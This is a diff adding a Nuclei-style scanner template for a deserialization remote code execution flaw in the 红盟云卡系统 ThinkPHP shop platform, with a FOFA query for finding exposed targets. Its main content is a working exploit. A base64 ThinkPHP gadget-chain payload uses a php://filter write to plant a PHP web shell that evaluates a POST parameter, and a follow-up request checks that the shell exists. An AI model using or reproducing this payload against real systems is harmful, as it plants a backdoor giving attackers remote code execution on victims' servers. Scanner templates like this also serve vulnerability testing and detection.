@@ -1,0 +1,35 @@
+id: hongmeng-card-system-deserialization-rce
+
+info:
+  name: "红盟云卡系统 OrderContent 参数反序列化导致远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: Fofa:"/assets/shop/dist/uaredirect.js?v=1.2.0"
+          红盟云卡系统为基于ThinkPHP框架构建的虚拟商品销售平台，具备多规格商品管理、微信订单集成及分站部署功能。在 /application/shop/controller/Order.php 组件中，orderContent 参数经 unserialize 反序列化处理时未有效过滤输入数据，攻击者可利用已知反序列化链构造恶意负载，通过前端接口触发任意代码执行。该漏洞源于反序列化操作对用户输入的直接处理，结合可利用的类方法链实现代码注入。
+  tags: 红盟云卡系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /shop/order/orderContent?order_no=123 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+
+    search_content=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ4eHgiO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7aTowO3M6MTE6IgAqAGJpbmRBdHRyIjthOjE6e2k6MDtzOjM6Inh4eCI7fXM6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTozNjAwO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjEyMjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYudXRmLTgudXRmLTd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPWFhYVBEOXdhSEFnUUdWMllXd29KRjlRVDFOVVd5ZGpZMk1uWFNrN1B6NGcvLi4vYS5waHAiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czo2OiIAKgB0YWciO3M6MzoieHh4Ijt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319fX1zOjY6InBhcmVudCI7cjoxMTt9fX0=
+- raw:
+  - |
+    GET /a.php12ac95f1498ce51d2d96a249c09c1998.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
